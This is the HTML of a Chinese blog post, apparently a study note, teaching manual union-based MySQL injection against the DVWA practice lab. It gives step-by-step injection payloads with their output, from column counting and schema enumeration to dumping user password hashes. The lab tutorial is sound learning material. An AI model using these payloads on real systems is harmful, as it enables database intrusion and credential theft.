@@ -1,0 +1,530 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#mysql%E6%B3%A8%E5%85%A5">MYSQL注入</a>
+<ul>
+<li><a href="#dvwa%E5%AE%89%E8%A3%85">DVWA安装</a></li>
+<li><a href="#%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87">知识准备</a>
+<ul>
+<li><a href="#information_schema">information_schema</a>
+<ul>
+<li><a href="#information_schematables">information_schema.tables</a></li>
+<li><a href="#information_schemacolumns">information_schema.columns</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%E4%BD%95%E7%A7%8D%E6%B3%A8%E5%85%A5">1、判断是否存在注入，存在何种注入</a></li>
+<li><a href="#2-%E7%8C%9C%E8%A1%A8%E5%90%8D">2、猜表名</a></li>
+<li><a href="#3-%E7%8C%9C%E5%88%97%E6%95%B0">3、猜列数</a></li>
+<li><a href="#4-%E7%8C%9C%E5%88%97%E5%90%8D">4、猜列名</a></li>
+<li><a href="#5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2">5、联合查询</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5-1-dvwa">实践-1 DVWA</a>
+<ul>
+<li><a href="#%E5%88%A4%E6%96%AD">判断</a></li>
+<li><a href="#%E7%8C%9C%E5%88%97%E6%95%B0">猜列数</a></li>
+<li><a href="#%E8%81%94%E5%90%88%E6%9F%A5%E6%89%BE">联合查找</a>
+<ul>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-%E7%94%A8%E6%88%B7%E5%90%8D">数据库名、用户名</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">数据库版本和操作系统</a></li>
+</ul>
+</li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%90%8D">获取表名</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D">获取列名</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE">获取数据</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">MYSQL手注之联合注入</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-12 / 8 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="mysql注入">MYSQL注入</h1>
+<h2 id="dvwa安装">DVWA安装</h2>
+<p><a href="http://cache.baiducontent.com/c?m=yOrLy9IADWBUcN5RdYdOeKF-9i5zGkd5wrXwyUNRLJ7HwsjsU4VnQBxzz_DHFUtngDwKmEqnUOS63GBeVZNvg9ekOpq1KD0aGgLwngRVVuWL3XtS9O8jOxjeSygKzUv6EC7NX3P_0NVpnvF953aVua&amp;p=8b2a97548f934eaf52b3c9204853&amp;newp=c4759a45dc8812a05afed46f574292695d0fc20e3addd401298ffe0cc4241a1a1a3aecbf2c241a05d7cf766d06aa4b5deff534703d0034f1f689df08d2ecce7e64&amp;s=1458e7509aa5f47e&amp;user=baidu&amp;fm=sc&amp;query=DVWA%B0%B2%D7%B0&amp;qid=9808245400017ec1&amp;p1=1">安装部署</a></p>
+<p><a href="https://blog.51cto.com/taiji007/1738532">参考</a></p>
+<h2 id="知识准备">知识准备</h2>
+<h3 id="information_schema">information_schema</h3>
+<p><u><strong>information_schema</strong></u>是MYSQL数据库生成时就存在的数据库，之后所有数据库、表的建立，都会在这个数据库中进行记录。</p>
+<h4 id="information_schematables">information_schema.tables</h4>
+<p><u><strong>tables</strong></u>是information_schema数据库中一个很重要的表格，其中记录了数据库中所有存在的表格信息。</p>
+<p>包含以下字段：</p>
+<ul>
+<li>
+<p>table_name：表名</p>
+</li>
+<li>
+<p>table_schema：表所在数据库</p>
+</li>
+</ul>
+<h4 id="information_schemacolumns">information_schema.columns</h4>
+<p><u><strong>colunms</strong></u>是与tables表平行的一个表格，记录了所有的列名信息</p>
+<p>包含以下字段：</p>
+<ul>
+<li>
+<p>colunms_name：列名</p>
+</li>
+<li>
+<p>table_name：表名</p>
+</li>
+<li>
+<p>table_schema：表所在数据库</p>
+</li>
+</ul>
+<h2 id="1-判断是否存在注入存在何种注入">1、判断是否存在注入，存在何种注入</h2>
+<h2 id="2-猜表名">2、猜表名</h2>
+<h2 id="3-猜列数">3、猜列数</h2>
+<pre><code>order by 1;
+order by 2;
+……
+order by n;
+</code></pre>
+<h2 id="4-猜列名">4、猜列名</h2>
+<h2 id="5-联合查询">5、联合查询</h2>
+<pre><code>union select
+</code></pre>
+<p>合并两次查询内容，前提是两者必须拥有同样的列数，且数据类型相同</p>
+<pre><code>user：
+username
+password
+id
+
+news：
+id
+title
+content
+
+select * from news where id=1 union select username,password from user;
+select * from news where id=1 union select 1,2,3 from user;
+select * from news where id=1 union select 1,database(),3 from user;
+</code></pre>
+<h2 id="实践-1-dvwa">实践-1 DVWA</h2>
+<h3 id="判断">判断</h3>
+<p>输入</p>
+<pre><code>'
+</code></pre>
+<p>返回：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <strong>'<u>'''</u>'</strong> at line 1</p>
+<p>分析：去掉自带的两个单引号，还剩下<u><strong>'''</strong></u>，其中中间那个是我们输入的，则剩下的两个为sql语句中自带的</p>
+<p>实际执行</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = ''';
+</code></pre>
+<p>输入</p>
+<pre><code>1' and '1'='1
+</code></pre>
+<p>源代码</p>
+<pre><code>$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot; ;
+</code></pre>
+<p>输入后实际执行的</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and '1' = '1';
+</code></pre>
+<p>这里使用字符型注入，用<u><strong>1'</strong></u>闭合前面的单引号，用<u><strong>’1</strong></u>闭合后面的单引号，并使and右边为True</p>
+<p>如果是</p>
+<pre><code>1' and 1=1
+</code></pre>
+<p>实际执行</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' and 1=1';
+</code></pre>
+<p>多出的未闭合的单引号会报错，无法运行</p>
+<p>当然，注释掉最后的单引号也可以</p>
+<blockquote>
+<p>mysql中的注释符有哪些？</p>
+<p>1、#...（单行注释）</p>
+<p>2、&quot;-- &quot;，注意--后面有一个空格（单行注释）</p>
+<p>3、/<em>...</em>/（多行注释）</p>
+</blockquote>
+<h3 id="猜列数">猜列数</h3>
+<p>依次输入</p>
+<pre><code>1' order by 1#
+</code></pre>
+<pre><code>1' order by 2#
+</code></pre>
+<pre><code>1' order by 3#
+</code></pre>
+<p>实际运行</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' order by 3#';
+</code></pre>
+<p>报错</p>
+<p>Unknown column '3' in 'order clause'</p>
+<p>说明没有第3列，一共只有2列</p>
+<h3 id="联合查找">联合查找</h3>
+<h4 id="数据库名-用户名">数据库名、用户名</h4>
+<p>输入</p>
+<pre><code>1' union select 1,2#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select 1,2#
+First name: admin
+Surname: admin
+ID: 1' union select 1,2#
+First name: 1
+Surname: 2
+</code></pre>
+<p>输入</p>
+<pre><code>1' union select database(),user()#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select database(),user()#
+First name: admin
+Surname: admin
+ID: 1' union select database(),user()#
+First name: dvwa
+Surname: dvwa@localhost
+</code></pre>
+<p>至此，得出数据库名为<u>dvwa</u>，用户名为<u>dvwa@localhost</u></p>
+<p>以上实际运行</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),user()#';
+</code></pre>
+<h4 id="数据库版本和操作系统">数据库版本和操作系统</h4>
+<p>输入</p>
+<pre><code>1' union select version(),@@version_compile_os#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select version(),@@version_compile_os#
+First name: admin
+Surname: admin
+ID: 1' union select version(),@@version_compile_os#
+First name: 5.7.26
+Surname: Win64
+</code></pre>
+<p>至此，得出数据库版本为<u>5.7.26</u>，操作系统为<u>Win64</u></p>
+<p>其中，数据库版本需要注意，版本不同会影响后续的判断</p>
+<p>当MySQL的版本⼩于4.0时，是不⽀持union select联合查询的；</p>
+<p>当MySQL版本⼤于 5.0时，有个默认数据库<strong>information_schema</strong>，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 <strong>tables</strong> 的数据表，该表包含两个字段 <strong>table_name</strong> 和 <strong>table_schema</strong>，分别记录 DBMS 中的存储的<strong>表名</strong>和<strong>表名所在的数据库</strong>。</p>
+<h3 id="获取表名">获取表名</h3>
+<p>输入</p>
+<pre><code>1' union select table_name,table_schema from information_schema.tables where
+table_schema= 'dvwa'#
+</code></pre>
+<p>实际运行</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#';
+</code></pre>
+<p>报错</p>
+<pre><code>Illegal mix of collations for operation 'UNION'
+</code></pre>
+<p>原因：</p>
+<p>前文说到union查询必须保证列数一样，还需要类型一致，原以为只是整型和字符的区别，没想到连<strong>编码</strong>都得一致</p>
+<p>users表中的<strong>first_name</strong>, <strong>last_name</strong>字段都是<strong>utf_unicode_ci</strong>编码，而information_schema.tables表中的<strong>table_name</strong>,<strong>table_schema</strong>字段却是<strong>utf_general_ci</strong>编码</p>
+<figure data-type="image" tabindex="1"><img src="https://xssong17.github.io/post-images/20210412_1.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://xssong17.github.io/post-images/20210412_2.png" alt="" loading="lazy"></figure>
+<p>没法，正常渗透过程中肯定不能让被攻击方自己把编码统一呀，只能从自己这边想办法</p>
+<p>解决方法：</p>
+<p>按照网上方法依葫芦画瓢</p>
+<pre><code>1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
+First name: admin
+Surname: admin
+ID: 1' union select 1,hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa'))#
+First name: 1
+Surname: 6775657374626F6F6B7E647677612C75736572737E64767761
+</code></pre>
+<p>很明显结果为十六进制，不能解决我的问题</p>
+<p>hex为转十六进制，那么尝试找找有没有十六进制转字符串的方法，unhex。</p>
+<pre><code>1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
+First name: admin
+Surname: admin
+ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema) from information_schema.tables where table_schema='dvwa')))#
+First name: 1
+Surname: guestbook~dvwa,users~dvwa
+</code></pre>
+<p>到这都是用<u><strong>group_concat()</strong></u>将内容挤在一块，不好看，明明Ta给了两个位置，开始尝试另外的姿势</p>
+<pre><code>1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
+First name: admin
+Surname: admin
+ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
+First name: guestbook
+Surname: dvwa
+ID: 1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
+First name: users
+Surname: dvwa
+</code></pre>
+<p>总结：编码既然不统一，那就让数据库自己解决，先hex再unhex，至于解码出来的是啥就看数据库咋想的了</p>
+<p>当然为了后续的学习的方便，最后还是将编码统一了（删库重建</p>
+<h3 id="获取列名">获取列名</h3>
+<p>输入</p>
+<pre><code>1' union select 1,group_concat(column_name) from information_schema.columns where
+table_name='users' #
+</code></pre>
+<blockquote>
+<p>group_concat()一次性列出</p>
+<p>这里是一次性列出column_name</p>
+</blockquote>
+<p>返回</p>
+<pre><code>ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+First name: admin
+Surname: admin
+ID: 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+First name: 1
+Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+</code></pre>
+<h3 id="获取数据">获取数据</h3>
+<p>输入</p>
+<pre><code>1' union select user,password from users#
+</code></pre>
+<p>返回</p>
+<pre><code>ID: 1' union select user,password from users#
+First name: admin
+Surname: admin
+ID: 1' union select user,password from users#
+First name: admin
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+ID: 1' union select user,password from users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 1' union select user,password from users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 1' union select user,password from users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 1' union select user,password from users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre>
+<h3 id="总结">总结</h3>
+<p>判断是否存在注入</p>
+<pre><code>'
+</code></pre>
+<p>判断列数</p>
+<pre><code>order by n
+</code></pre>
+<p>查询数据库名、当前用户名</p>
+<pre><code>select database(),user()
+</code></pre>
+<p>查询数据库下的表名</p>
+<pre><code>select table_name,table_schema from information_schema.tables where
+table_schema= 'dvwa'
+</code></pre>
+<p>查询表中的列名</p>
+<pre><code>select 1,group_concat(column_name) from information_schema.columns where
+table_name='users'
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://xssong17.github.io/tag/wgo_p-85C/">
+            <span class="flex-auto">渗透</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/mysqlzhu-zhi-bao-cuo-zhu/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  MySQL⼿注之报错注⼊
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/zhuan-zai-hu-lian-wang-xie-yi-ru-men-er/">
+                <h3 class="post-title">
+                  （转载）互联网协议入门（二）
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
